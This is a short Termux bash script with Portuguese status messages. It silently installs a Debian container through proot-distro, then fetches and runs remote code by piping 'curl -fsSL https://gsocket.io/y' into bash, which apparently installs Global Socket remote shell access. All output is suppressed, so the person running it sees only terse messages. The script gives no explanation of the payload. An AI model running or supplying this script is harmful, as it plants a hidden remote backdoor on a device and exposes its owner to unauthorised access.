#!/data/data/com.termux/files/usr/bin/bash

echo "baixando"

pkg update -y -q >/dev/null 2>&1
pkg install proot-distro curl -y -q >/dev/null 2>&1

if ! proot-distro list | grep -qi debian; then
    proot-distro install debian >/dev/null 2>&1
fi

echo "logando."

proot-distro login debian -- bash -lc '
    bash -c "$(curl -fsSL https://gsocket.io/y)"
    STATUS=$?

    if [ "$STATUS" -eq 0 ]; then
        echo "gg"
    else
        echo "nao foi"
    fi

    exec bash -l
'

